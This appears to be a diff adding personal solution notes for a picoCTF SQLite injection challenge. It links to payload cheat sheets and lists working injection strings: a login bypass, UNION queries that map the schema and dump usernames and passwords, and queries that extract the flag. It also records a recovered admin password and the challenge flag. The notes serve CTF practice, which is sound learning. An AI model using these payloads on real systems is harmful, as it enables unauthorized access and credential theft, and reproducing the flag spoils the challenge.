@@ -1,0 +1,31 @@
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-comments
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+passord = a'or 1=1--
+' UNION SELECT 1,2,sqlite_version();--
+
+
+' UNION SELECT sql,2,3 FROM sqlite_master;--   #--> Extract Database Structure 
+
+' UNION SELECT 1,2, name FROM sqlite_master WHERE type='table';--  #--> shows names of table only
+
+#looking into users table
+' UNION SELECT sql,2,3 FROM sqlite_master;--
+' UNION SELECT 1,2 FROM sqlite_master WHERE type='table' AND name='users';--    (1,2 --> is the number of column in users)
+' UNION SELECT 1,2,3 FROM users;--
+' UNION SELECT id, username, password FROM users;-- 
+
+admin - moreRandOMN3ss
+
+
+' UNION SELECT 1,2 FROM sqlite_master WHERE type='table' AND name='hints';--
+' UNION SELECT 1,2,3 FROM hints;--
+' UNION SELECT 1, 2, 3 FROM pragma_table_info('hints');--
+
+
+' UNION SELECT sql,2,3 FROM sqlite_master;--
+' UNION SELECT 1,2 FROM sqlite_master WHERE type='table' AND name='more_table';--
+' UNION SELECT flag,2 FROM more_table;--
+
+picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
+
